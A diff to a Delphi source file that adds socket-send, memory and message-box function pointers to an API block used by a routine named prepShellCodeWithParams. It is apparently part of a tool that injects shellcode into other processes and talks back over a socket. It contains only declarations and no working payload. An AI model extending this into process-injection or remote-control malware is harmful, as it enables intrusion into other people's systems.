@@ -9,15 +9,24 @@ type
   xGetMemory = function(dwLen:Integer):Pointer;
   xFreeMemory = procedure(ptrMemory:Pointer);
   xCopyMemory = procedure(pDestiny, pSource:Pointer; dwLen:Integer);
+  xZeroMemory = procedure(Destination: Pointer; Length: DWORD);
+  xwsprintfA = function (lpOut: PChar; lpFmt: PChar; lpVars: Array of Const):Integer;
+  xSendBuffer = function (hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
+  xMessageBox = function(hWnd: HWND; lpText, lpCaption: PChar; uType: UINT): Integer; stdcall;
 
 type
   TAPIBlock = record
+    hSocket:            Cardinal;
     hKernelHandle:      Cardinal;
     pGetProcAddress:    xGetProcAddress;
     pLoadLibraryA:      xLoadLibrary;
     pGetMemory:         xGetMemory;
     pFreeMemory:        xFreeMemory;
     pCopyMemory:        xCopyMemory;
+    pZeroMemory:        xZeroMemory;
+    pwsprintfA:         xwsprintfA;
+    pSendBuffer:        xSendBuffer;
+    pMessageBox:        xMessageBox;
   end;
   PAPIBlock = ^TAPIBlock;
 
@@ -37,7 +46,6 @@ implementation
 
 function prepShellCodeWithParams(pFunc, pParam:Pointer; dwFunc, dwParam:Cardinal; var buffLen:Cardinal):Pointer;
 var
-  dwFullLen:Cardinal;
   pResult:Pointer;
 begin
   buffLen := dwFunc + dwParam + 4;
